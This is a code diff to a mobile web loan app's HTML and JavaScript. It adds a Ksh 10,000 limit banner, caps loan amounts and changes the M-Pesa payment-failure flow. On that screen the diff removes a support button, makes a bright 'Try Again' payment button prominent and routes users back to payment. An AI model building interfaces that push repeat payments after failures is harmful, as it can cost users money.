@@ -426,6 +426,14 @@
                     <button onclick="submitLogin()" class="native-btn mt-4">Create Account</button>
                 </div>
                 <p class="text-center text-xs text-slate-400 mt-6 font-medium">🔒 Your data is encrypted and safe</p>
+                
+                <!-- CONTACT SUPPORT ADDED HERE -->
+                <div class="mt-6 pt-5 border-t border-slate-100 text-center">
+                    <p class="text-xs text-slate-500 mb-2">Having trouble creating an account?</p>
+                    <a href="mailto:support@zambiacash.com?subject=Registration Support" class="inline-block bg-slate-100 hover:bg-slate-200 text-brandBlue font-bold text-sm px-4 py-2 rounded-lg transition-colors">
+                        Contact Support
+                    </a>
+                </div>
             </div>
         </div>
     </div>
@@ -445,9 +453,18 @@
     <!-- LOAN SELECTION -->
     <div id="screen-select" class="screen app-shell" style="padding: 0 0 32px 0;">
         <div class="app-bar">
-            <div>
+            <div class="w-full">
                 <h1 class="app-bar-title">Hello, <span id="greeting-name">there</span></h1>
-                <p class="text-xs text-slate-500 mt-0.5">Choose your loan amount</p>
+                <!-- LIMIT INDICATOR ADDED HERE -->
+                <p class="text-xs text-slate-500 mt-0.5">Your maximum limit is <span class="font-bold text-emerald-600 text-sm">Ksh 10,000</span></p>
+                
+                <!-- QUALIFICATION BANNER -->
+                <div class="mt-3 bg-emerald-50 border border-emerald-200 rounded-xl p-3 flex items-center gap-3">
+                    <div class="bg-emerald-100 p-2 rounded-full flex-shrink-0">
+                        <svg class="w-5 h-5 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    </div>
+                    <p class="text-sm text-emerald-800 font-semibold">You qualify for up to Ksh 10,000!</p>
+                </div>
             </div>
         </div>
         <div style="padding: 0 20px;">
@@ -541,14 +558,20 @@
                     <p style="font-size: 13px; color: #334155; font-weight: 500; margin-bottom: 8px;">If your M-Pesa was deducted but you see this message:</p>
                     <ol style="font-size: 12px; color: #64748B; list-style-type: decimal; padding-left: 16px; space-y: 4px;">
                         <li>Wait 2 minutes for the network to sync.</li>
-                        <li>Tap "Check Status Again" below.</li>
+                        <li>Tap "Check Status" below.</li>
                         <li>If it still fails, contact support with your M-Pesa code.</li>
                     </ol>
                 </div>
 
-                <button onclick="checkStatusManual()" id="btn-check-status-failed" class="native-btn" style="margin-bottom: 12px; background: #1E40AF; display: flex; justify-content: center;"><span>Check Status Again</span></button>
-                <button onclick="window.location.href='mailto:support@zambiacash.com?subject=Payment Issue'" class="native-btn" style="margin-bottom: 12px; background: #475569; display: flex; justify-content: center;"><span>Contact Support</span></button>
-                <button onclick="retryPayment()" id="btn-retry-failed" class="native-btn" style="margin-bottom: 12px; background: #FFFFFF; color: #1E40AF; border: 1.5px solid #1E40AF; display: flex; justify-content: center; align-items: center;">Cancel & Try Again</button>
+                <!-- BRIGHT TRY AGAIN BUTTON -->
+                <button id="btn-retry-failed" class="native-btn" style="margin-bottom: 12px; background: linear-gradient(135deg, #10B981 0%, #059669 100%); color: white; font-size: 17px; box-shadow: 0 8px 20px -6px rgba(16, 185, 129, 0.6); display: flex; justify-content: center; align-items: center; border: none; font-weight: 800;">
+                    Try Again
+                </button>
+
+                <!-- SUBTLE CHECK STATUS BUTTON -->
+                <button onclick="checkStatusManual()" id="btn-check-status-failed" class="native-btn" style="margin-bottom: 12px; background: #FFFFFF; color: #475569; border: 1.5px solid #CBD5E1; display: flex; justify-content: center; align-items: center; box-shadow: 0 1px 2px 0 rgba(0,0,0,0.05);">
+                    <span>Check Status</span>
+                </button>
             </div>
 
             <!-- PENDING -->
@@ -996,16 +1019,37 @@ function submitLogin(){
 function buildLoanScreen(){
     const first = state.name.split(' ')[0];
     document.getElementById('greeting-name').innerText = first || 'there';
+    
+    // Set the default selected loan to 1000
+    state.loan = 1000;
 
     const grid = document.getElementById('amount-grid');
     grid.innerHTML = '';
+    
     amounts.forEach(a=>{
         const b = document.createElement('button');
-        b.className = `amount-btn ${a === state.loan ? 'selected' : ''}`;
+        
+        // Visually dim amounts above 10,000
+        if (a > 10000) {
+            b.className = `amount-btn relative opacity-50 bg-slate-50 border-slate-200 text-slate-400`;
+        } else {
+            b.className = `amount-btn ${a === state.loan ? 'selected' : ''}`;
+        }
+        
         b.innerText = a.toLocaleString();
-        b.onclick = ()=>{ document.querySelectorAll('.amount-btn').forEach(x=>x.classList.remove('selected')); b.classList.add('selected'); state.loan = a; updateSummary(); };
+        b.onclick = ()=>{ 
+            if (a > 10000) {
+                if (window.showToast) window.showToast("❌ Your maximum limit is Ksh 10,000.");
+                return;
+            }
+            document.querySelectorAll('.amount-btn').forEach(x=>x.classList.remove('selected')); 
+            b.classList.add('selected'); 
+            state.loan = a; 
+            updateSummary(); 
+        };
         grid.appendChild(b);
     });
+    
     updateSummary();
     showScreen('screen-select');
 }
@@ -1253,7 +1297,8 @@ function retryPayment(){
     const getAttempts = () => parseInt(localStorage.getItem('zc_failed_attempts') || '0');
     const setAttempts = (val) => localStorage.setItem('zc_failed_attempts', val);
 
-    function showSpamPrompt(remaining) {
+    // Updated to accept a callback for the OK button
+    function showSpamPrompt(remaining, onOkCallback) {
         const existingModal = document.getElementById('spam-prompt-modal');
         if (existingModal) existingModal.remove();
 
@@ -1272,7 +1317,7 @@ function retryPayment(){
                             attempt${remaining === 1 ? '' : 's'} remaining.
                         </p>
 
-                        <button onclick="document.getElementById('spam-prompt-modal').remove()" class="native-btn" style="padding: 14px; min-height: 48px; font-size: 15px;">
+                        <button onclick="document.getElementById('spam-prompt-modal').remove(); if(typeof onOkCallback === 'function') onOkCallback();" class="native-btn" style="padding: 14px; min-height: 48px; font-size: 15px;">
                             OK
                         </button>
                     </div>
@@ -1282,6 +1327,7 @@ function retryPayment(){
         document.body.insertAdjacentHTML('beforeend', modalHTML);
     }
 
+    // 2. Intercept the FAILED screen
     const originalShowFailed = window.showFailed;
     window.showFailed = function() {
         if (originalShowFailed) originalShowFailed.call(this);
@@ -1325,15 +1371,16 @@ function retryPayment(){
             `;
             
             if (retryBtn) {
-                retryBtn.innerText = "Return to Loan Selection";
                 retryBtn.onclick = function() {
                     if (typeof stopPolling === 'function') stopPolling();
                     isProcessingPayment = false; 
                     currentTxnId = null;
                     
-                    showScreen('screen-select');
-                    
-                    showSpamPrompt(remaining);
+                    // Show the prompt, and when they click OK, go to payment
+                    showSpamPrompt(remaining, function() {
+                        showScreen('screen-payment');
+                        resetPayButton();
+                    });
                 };
             }
             
@@ -1341,12 +1388,14 @@ function retryPayment(){
         }
     };
 
+    // 3. Intercept the SUCCESS screen (to reset the counter)
     const originalShowSuccess = window.showSuccess;
     window.showSuccess = function() {
         setAttempts(0); 
         if (originalShowSuccess) originalShowSuccess.call(this);
     };
 
+    // 4. Intercept the PAYMENT INITIATION (to prevent blocked users from clicking Pay)
     const originalProcessPayment = window.processPayment;
     window.processPayment = function() {
         if (getAttempts() >= MAX_ATTEMPTS) {
@@ -1356,6 +1405,7 @@ function retryPayment(){
         if (originalProcessPayment) originalProcessPayment.call(this);
     };
 
+    // 5. Check if user is blocked when they open the app/reload
     window.addEventListener('DOMContentLoaded', () => {
         if (getAttempts() >= MAX_ATTEMPTS) {
             const payBtn = document.getElementById('btn-pay');
